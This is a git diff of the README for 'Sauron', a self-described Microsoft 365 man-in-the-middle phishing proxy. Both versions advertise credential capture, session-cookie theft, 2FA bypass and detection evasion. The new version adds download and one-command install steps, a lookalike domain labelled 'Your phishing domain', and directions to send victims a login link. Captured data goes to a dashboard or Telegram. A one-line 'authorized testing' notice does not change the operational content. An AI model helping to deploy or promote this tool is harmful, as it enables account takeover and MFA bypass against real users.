@@ -1,134 +1,133 @@
 
 # Sauron - Microsoft 365 MITM Proxy
 
-A powerful phishing tool that intercepts Microsoft 365 login flows to capture credentials, cookies, and session data in real-time.
+Microsoft 365 login flow interception for credential capture and session harvesting.
 
-## ✨ What It Does
+## 🎯 What It Does
 
-- **Captures Credentials**: Gets usernames, passwords, and 2FA tokens
-- **Steals Sessions**: Harvests authentication cookies
-- **Real-time Monitoring**: WebSocket dashboard for live campaign tracking
-- **Auto SSL**: Automatic HTTPS certificates via Let's Encrypt
-- **Advanced Evasion**: Bot detection bypass and traffic obfuscation
+- **Captures Credentials**: Real-time username/password capture
+- **Steals Sessions**: Microsoft authentication cookies and tokens
+- **2FA Bypass**: Multi-factor authentication token harvesting
+- **Live Monitoring**: WebSocket dashboard for real-time operations
+- **SSL Automation**: Automatic HTTPS certificates
 
-## 🚀 Quick Start
+## 🚀 Installation
 
-### 1. Requirements
+### Requirements
 
-- Ubuntu 20.04+ server with root access
-- Domain name (buy from any registrar)
-- Cloudflare account (free)
+- Ubuntu 20.04+ VPS with root access
+- Domain name pointed to your server
+- Cloudflare account (free tier works)
 
-### 2. Setup Your Domain
-
-1. Buy a domain like `microsoftlogin365.com`
-2. Add it to Cloudflare (free account)
-3. Set DNS: `*.yourdomain.com` → your server IP
-
-### 3. Install
-
-#### Commercial Docker Release (Recommended)
+### Production Release (Linux VPS)
 
 ```bash
-# Download the commercial release
-# Contact sales for access to: sauron-v2.0.0-pro-docker.tar.gz
+# 1. Download the latest Linux release
+wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz
 
-# Extract release package
-tar -xzf sauron-v2.0.0-pro-docker.tar.gz
-cd docker-release-v2.0.0-pro
+# 2. Extract and install
+tar -xzf sauron-linux-amd64.tar.gz
+cd sauron
 
-# Configure environment
-cp .env.example .env
-nano .env  # Fill in your SAURON_DOMAIN, CLOUDFLARE_API_TOKEN, etc.
-
-# Deploy (installs Docker automatically)
-sudo ./deploy-docker.sh
+# 3. One-command setup (handles everything automatically)
+sudo ./install-production.sh
 ```
 
-#### Development Build (Source Code Access Required)
+**That's it!** The installer will:
+- Install Docker and system dependencies automatically
+- Walk you through Cloudflare setup step-by-step
+- Configure SSL certificates with Let's Encrypt
+- Start Sauron service automatically
+
+### Development Build (Source Access)
 
 ```bash
-# Only for licensed developers with source access
+# Only if you have source code access
 git clone https://github.com/Skillz147/Sauron-Pro.git
 cd Sauron-Pro
-cp .env.example .env
-nano .env
-sudo bash install/setup.sh
+sudo ./install/setup.sh
 ```
 
-### 4. Configure
+### Configuration
 
-The setup script will ask for:
+Edit `.env` file with your settings:
 
-- **Domain**: Your purchased domain (e.g., `microsoftlogin365.com`)
-- **Cloudflare API Token**: Get from Cloudflare dashboard
-- **Turnstile Secret**: Get from Cloudflare Turnstile settings
+```bash
+# Your phishing domain
+SAURON_DOMAIN=microsoftlogin365.com
 
-### 5. Create Operation
+# Cloudflare API token (for SSL automation)
+CLOUDFLARE_API_TOKEN=your_token_here
 
-1. Open the admin dashboard: `https://yourdomain.com/admin`
-2. Create a new slug (unique operation ID)
-3. Send targets to: `https://login.yourdomain.com/your-slug`
+# Turnstile secret (optional bot protection)
+TURNSTILE_SECRET=your_secret_here
+```
 
 ## 📱 Usage
 
-### Managing Operations
+### Access Points
+
+- **Admin Panel**: `https://yourdomain.com/admin`
+- **Statistics**: `https://yourdomain.com/stats`
+- **WebSocket**: `wss://yourdomain.com/ws`
+
+### Creating Operations
+
+1. Open admin panel: `https://yourdomain.com/admin`
+2. Create a new slug (operation identifier)
+3. Send targets to: `https://login.yourdomain.com/your-slug`
+
+### Management Commands
 
 ```bash
 # Check status
 sudo systemctl status sauron
 
-# View live logs
+# View logs
 sudo journalctl -u sauron -f
 
 # Restart service
 sudo systemctl restart sauron
 ```
 
-### Getting Results
+## 🛠️ Development
 
-- **Telegram**: Auto-delivery of captured data
-- **WebSocket Dashboard**: Real-time monitoring
-- **Logs**: JSON formatted results in system logs
+### Building Releases
 
-## 🛡️ Features
+```bash
+# Build binary release package
+./scripts/build-release.sh v2.0.1
 
-- **TLS Interception**: Full Microsoft 365 flow capture
-- **Anti-Detection**: Bypasses modern security measures
-- **Cookie Harvesting**: Maintains persistent access
-- **2FA Bypass**: Captures MFA tokens and session cookies
-- **Operation Isolation**: Multiple simultaneous operations
+# Build Docker release package
+./scripts/build-docker-release.sh v2.0.1
+
+# Deploy to production server
+./scripts/deploy-production.sh
+```
+
+### Project Structure
+
+- `main.go` - Main application entry point
+- `capture/` - Credential and session capture logic
+- `inject/` - JavaScript injection and obfuscation
+- `proxy/` - MITM proxy and TLS interception
+- `ws/` - WebSocket management interface
+- `install/` - Installation and setup scripts
 
 ## 📚 Documentation
 
-For detailed setup guides, troubleshooting, and advanced features:
 **[📖 Full Documentation](https://skillz147.github.io/Sauron-Pro)**
+
+Includes:
+- Advanced configuration options
+- API endpoint documentation
+- Troubleshooting guides
+- Security best practices
 
 ## ⚠️ Legal Notice
 
-This tool is for authorized security testing only. Users are responsible for compliance with applicable laws and regulations.
+This tool is for authorized security testing and educational purposes only. Users are responsible for compliance with applicable laws and regulations.
 
-## 🔧 Internal Development
+---
 
-**For licensed developers and internal team only**
-
-```bash
-# Clone source repository (requires access)
-git clone https://github.com/Skillz147/Sauron-Pro.git
-cd Sauron-Pro
-
-# Build commercial Docker release
-./scripts/build-docker-release.sh v2.0.0-pro
-
-# Build binary release
-./scripts/build-release.sh v2.0.0-pro
-
-# Deploy to development server
-./scripts/deploy-production.sh docker
-```
-
-## 📞 Support
-
-- **Issues**: [GitHub Issues](https://github.com/Skillz147/Sauron-Pro/issues)
-- **Documentation**: [GitHub Pages](https://skillz147.github.io/Sauron-Pro)
-- **Security Reports**: Private disclosure preferred
+**For questions or issues, check the documentation or open a GitHub issue.**
